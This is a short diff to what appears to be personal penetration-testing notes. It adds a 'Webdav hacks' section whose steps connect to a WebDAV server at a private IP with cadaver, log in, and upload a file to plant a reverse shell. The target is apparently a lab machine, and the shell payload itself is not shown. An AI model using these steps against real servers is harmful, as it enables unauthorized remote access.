@@ -211,3 +211,11 @@ $cli_runner = new CLI_Runner();
 ## HTML entity encoder
 - https://mothereff.in/html-entities 
 - e.g. for java <xml>
+
+# Webdav hacks
+- if allow public method POST
+## Inject rev shell
+1. ``` cadaver http://192.168.219.122 ```
+2. input user name
+3. input password
+4. ``` put sussy.baka ```
